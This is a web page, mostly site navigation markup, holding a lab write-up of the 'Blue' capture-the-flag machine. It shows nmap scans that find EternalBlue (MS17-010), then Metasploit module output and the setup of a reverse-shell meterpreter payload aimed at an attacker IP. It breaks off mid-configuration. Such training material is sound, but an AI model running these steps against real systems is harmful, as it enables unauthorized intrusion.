+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Blue
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Blue
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reconosint" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon/OSINT
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap Scan
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../commandinjection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../commonlinuxprivesc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Common Linux Privesc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crosssitescripting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cross-site Scripting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../fileinclusion/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Inclusion
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hydra/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Hydra
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IDOR
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../johntheripper/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    John the Ripper
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../kenobi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kenobi
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../linuxprivesc/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux PrivEsc
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitexploitation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Exploitation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploitmeterpreter/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit - Meterpreter
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../motherssecret/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Mother's Secret
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../owaspjuiceshop/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Juice Shop
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../owasptop10_2021/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OWASP Top 10 - 2021
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../picklerick/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pickle Rick
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlinjection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sqlinjectionlab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection Lab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSRF
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../steelmountain/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Steel Mountain
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../subdomainenumeration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Subdomain Enumeration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../traverse/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Traverse
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../uploadvulnerabilities/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload Vulnerabilities
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vulnversity/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Vulnversity
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../whattheshell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    What the Shell?
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#reconosint" class="md-nav__link">
+    <span class="md-ellipsis">
+      Recon/OSINT
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap Scan
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#post-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  <h1>Blue</h1>
+
+<h2 id="reconosint">Recon/OSINT<a class="headerlink" href="#reconosint" title="Permanent link">&para;</a></h2>
+<p>Attacker IP: 10.2.4.35</p>
+<p>Target IP ($IP): 10.10.234.217</p>
+<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="nmap-scan">Nmap Scan<a class="headerlink" href="#nmap-scan" title="Permanent link">&para;</a></h3>
+<p>Enumerate open ports and services running on the target machine.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo nmap -sC -SV -oN nmap_initial.output $IP
+</code></pre></div>
+<p><img alt="Nmap Initial Scan" src="../../../assets/images/thm/blue/nmap_initial.png" /></p>
+<p>Let's run the <code>vuln</code> script to see if the target is vulnerable to any commonly known vulnerabilities.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo nmap -sV -oN nmap_vuln.output --script vuln $IP
+</code></pre></div>
+<p><img alt="Nmap Vuln Script Scan" src="../../../assets/images/thm/blue/nmap_vuln.png" /></p>
+<p>Looks like the target it vulnerable to <code>ms17-010: RCE vulnerability in Microsoft SMBv1 servers (Eternal Blue)</code></p>
+<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h2>
+<p>Let's start up Metasploit using the <code>msfconsole</code> command and exploit the vulnerability to gain a foothold on the target. Search for exploits related to <code>ms17-010</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>msf6 &gt; search ms17-010
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Matching Modules
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>================
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>   #  Name                                      Disclosure Date  Rank     Check  Description
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>   -  ----                                      ---------------  ----     -----  -----------
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>msf6 &gt;
+</code></pre></div>
+<p>Let's get some more information on the <code>exploit/windows/smb/ms17_010_eternalblue</code> module.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>msf6 &gt; info 0
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>     Module: exploit/windows/smb/ms17_010_eternalblue
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>   Platform: Windows
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>       Arch: x64
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a> Privileged: Yes
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    License: Metasploit Framework License (BSD)
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>       Rank: Average
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>  Disclosed: 2017-03-14
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>Provided by:
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>  Equation Group
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>  Shadow Brokers
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>  sleepya
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>  Sean Dillon &lt;sean.dillon@risksense.com&gt;
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>  Dylan Davis &lt;dylan.davis@risksense.com&gt;
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>  thelightcosine
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>  wvu &lt;wvu@metasploit.com&gt;
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>  agalway-r7
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>  cdelafuente-r7
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>  cdelafuente-r7
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>  agalway-r7
+<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>
+<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>Available targets:
+<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>  Id  Name
+<a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>  --  ----
+<a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>  0   Automatic Target
+<a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>  1   Windows 7
+<a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>  2   Windows Embedded Standard 7
+<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>  3   Windows Server 2008 R2
+<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>  4   Windows 8
+<a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>  5   Windows 8.1
+<a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>  6   Windows Server 2012
+<a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a>  7   Windows 10 Pro
+<a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a>  8   Windows 10 Enterprise Evaluation
+<a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a>
+<a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a>Check supported:
+<a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a>  Yes
+<a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a>
+<a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a>Basic options:
+<a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a>  Name           Current Setting  Required  Description
+<a id="__codelineno-3-43" name="__codelineno-3-43" href="#__codelineno-3-43"></a>  ----           ---------------  --------  -----------
+<a id="__codelineno-3-44" name="__codelineno-3-44" href="#__codelineno-3-44"></a>  RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework
+<a id="__codelineno-3-45" name="__codelineno-3-45" href="#__codelineno-3-45"></a>                                            /wiki/Using-Metasploit
+<a id="__codelineno-3-46" name="__codelineno-3-46" href="#__codelineno-3-46"></a>  RPORT          445              yes       The target port (TCP)
+<a id="__codelineno-3-47" name="__codelineno-3-47" href="#__codelineno-3-47"></a>  SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
+<a id="__codelineno-3-48" name="__codelineno-3-48" href="#__codelineno-3-48"></a>                                            Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
+<a id="__codelineno-3-49" name="__codelineno-3-49" href="#__codelineno-3-49"></a>                                            machines.
+<a id="__codelineno-3-50" name="__codelineno-3-50" href="#__codelineno-3-50"></a>  SMBPass                         no        (Optional) The password for the specified username
+<a id="__codelineno-3-51" name="__codelineno-3-51" href="#__codelineno-3-51"></a>  SMBUser                         no        (Optional) The username to authenticate as
+<a id="__codelineno-3-52" name="__codelineno-3-52" href="#__codelineno-3-52"></a>  VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
+<a id="__codelineno-3-53" name="__codelineno-3-53" href="#__codelineno-3-53"></a>                                            ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
+<a id="__codelineno-3-54" name="__codelineno-3-54" href="#__codelineno-3-54"></a>                                            ines.
+<a id="__codelineno-3-55" name="__codelineno-3-55" href="#__codelineno-3-55"></a>  VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
+<a id="__codelineno-3-56" name="__codelineno-3-56" href="#__codelineno-3-56"></a>                                             2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+<a id="__codelineno-3-57" name="__codelineno-3-57" href="#__codelineno-3-57"></a>
+<a id="__codelineno-3-58" name="__codelineno-3-58" href="#__codelineno-3-58"></a>Payload information:
+<a id="__codelineno-3-59" name="__codelineno-3-59" href="#__codelineno-3-59"></a>  Space: 2000
+<a id="__codelineno-3-60" name="__codelineno-3-60" href="#__codelineno-3-60"></a>
+<a id="__codelineno-3-61" name="__codelineno-3-61" href="#__codelineno-3-61"></a>Description:
+<a id="__codelineno-3-62" name="__codelineno-3-62" href="#__codelineno-3-62"></a>  This module is a port of the Equation Group ETERNALBLUE exploit, 
+<a id="__codelineno-3-63" name="__codelineno-3-63" href="#__codelineno-3-63"></a>  part of the FuzzBunch toolkit released by Shadow Brokers. There is a 
+<a id="__codelineno-3-64" name="__codelineno-3-64" href="#__codelineno-3-64"></a>  buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is 
+<a id="__codelineno-3-65" name="__codelineno-3-65" href="#__codelineno-3-65"></a>  calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error 
+<a id="__codelineno-3-66" name="__codelineno-3-66" href="#__codelineno-3-66"></a>  where a DWORD is subtracted into a WORD. The kernel pool is groomed 
+<a id="__codelineno-3-67" name="__codelineno-3-67" href="#__codelineno-3-67"></a>  so that overflow is well laid-out to overwrite an SMBv1 buffer. 
+<a id="__codelineno-3-68" name="__codelineno-3-68" href="#__codelineno-3-68"></a>  Actual RIP hijack is later completed in 
+<a id="__codelineno-3-69" name="__codelineno-3-69" href="#__codelineno-3-69"></a>  srvnet!SrvNetWskReceiveComplete. This exploit, like the original may 
+<a id="__codelineno-3-70" name="__codelineno-3-70" href="#__codelineno-3-70"></a>  not trigger 100% of the time, and should be run continuously until 
+<a id="__codelineno-3-71" name="__codelineno-3-71" href="#__codelineno-3-71"></a>  triggered. It seems like the pool will get hot streaks and need a 
+<a id="__codelineno-3-72" name="__codelineno-3-72" href="#__codelineno-3-72"></a>  cool down period before the shells rain in again. The module will 
+<a id="__codelineno-3-73" name="__codelineno-3-73" href="#__codelineno-3-73"></a>  attempt to use Anonymous login, by default, to authenticate to 
+<a id="__codelineno-3-74" name="__codelineno-3-74" href="#__codelineno-3-74"></a>  perform the exploit. If the user supplies credentials in the 
+<a id="__codelineno-3-75" name="__codelineno-3-75" href="#__codelineno-3-75"></a>  SMBUser, SMBPass, and SMBDomain options it will use those instead. 
+<a id="__codelineno-3-76" name="__codelineno-3-76" href="#__codelineno-3-76"></a>  On some systems, this module may cause system instability and 
+<a id="__codelineno-3-77" name="__codelineno-3-77" href="#__codelineno-3-77"></a>  crashes, such as a BSOD or a reboot. This may be more likely with 
+<a id="__codelineno-3-78" name="__codelineno-3-78" href="#__codelineno-3-78"></a>  some payloads.
+<a id="__codelineno-3-79" name="__codelineno-3-79" href="#__codelineno-3-79"></a>
+<a id="__codelineno-3-80" name="__codelineno-3-80" href="#__codelineno-3-80"></a>References:
+<a id="__codelineno-3-81" name="__codelineno-3-81" href="#__codelineno-3-81"></a>  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
+<a id="__codelineno-3-82" name="__codelineno-3-82" href="#__codelineno-3-82"></a>  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
+<a id="__codelineno-3-83" name="__codelineno-3-83" href="#__codelineno-3-83"></a>  https://nvd.nist.gov/vuln/detail/CVE-2017-0144
+<a id="__codelineno-3-84" name="__codelineno-3-84" href="#__codelineno-3-84"></a>  https://nvd.nist.gov/vuln/detail/CVE-2017-0145
+<a id="__codelineno-3-85" name="__codelineno-3-85" href="#__codelineno-3-85"></a>  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
+<a id="__codelineno-3-86" name="__codelineno-3-86" href="#__codelineno-3-86"></a>  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
+<a id="__codelineno-3-87" name="__codelineno-3-87" href="#__codelineno-3-87"></a>  https://nvd.nist.gov/vuln/detail/CVE-2017-0148
+<a id="__codelineno-3-88" name="__codelineno-3-88" href="#__codelineno-3-88"></a>  https://github.com/RiskSense-Ops/MS17-010
+<a id="__codelineno-3-89" name="__codelineno-3-89" href="#__codelineno-3-89"></a>  https://risksense.com/wp-content/uploads/2018/05/White-Paper_Eternal-Blue.pdf
+<a id="__codelineno-3-90" name="__codelineno-3-90" href="#__codelineno-3-90"></a>  https://www.exploit-db.com/exploits/42030
+<a id="__codelineno-3-91" name="__codelineno-3-91" href="#__codelineno-3-91"></a>
+<a id="__codelineno-3-92" name="__codelineno-3-92" href="#__codelineno-3-92"></a>Also known as:
+<a id="__codelineno-3-93" name="__codelineno-3-93" href="#__codelineno-3-93"></a>  ETERNALBLUE
+<a id="__codelineno-3-94" name="__codelineno-3-94" href="#__codelineno-3-94"></a>
+<a id="__codelineno-3-95" name="__codelineno-3-95" href="#__codelineno-3-95"></a>
+<a id="__codelineno-3-96" name="__codelineno-3-96" href="#__codelineno-3-96"></a>View the full module info with the info -d command.
+<a id="__codelineno-3-97" name="__codelineno-3-97" href="#__codelineno-3-97"></a>
+<a id="__codelineno-3-98" name="__codelineno-3-98" href="#__codelineno-3-98"></a>msf6 &gt; 
+</code></pre></div>
+<p>Let's go ahead and use this module and set the RHOSTS and LHOST options.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.234.217
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>RHOSTS =&gt; 10.10.234.217
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.2.4.35
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>LHOST =&gt; 10.2.4.35
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>Module options (exploit/windows/smb/ms17_010_eternalblue):
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>   Name           Current Setting  Required  Description
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>   ----           ---------------  --------  -----------
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>   RHOSTS         10.10.234.217    yes       The target host(s), see https://github.com/rapid7/metasploit-framewor
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>                                             k/wiki/Using-Metasploit
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>   RPORT          445              yes       The target port (TCP)
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>                                              Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targe
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>                                             t machines.
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>   SMBPass                         no        (Optional) The password for the specified username
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>   SMBUser                         no        (Optional) The username to authenticate as
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Win
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>                                             dows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target ma
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>                                             chines.
+<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serve
+<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>                                             r 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
+<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>
+<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>
+<a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>Payload options (windows/x64/meterpreter/reverse_tcp):
+<a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>
+<a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>   Name      Current Setting  Required  Description
+<a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>   ----      ---------------  --------  -----------
+<a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+<a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>   LHOST     10.2.4.35        yes       The listen address (an interface may be specified)
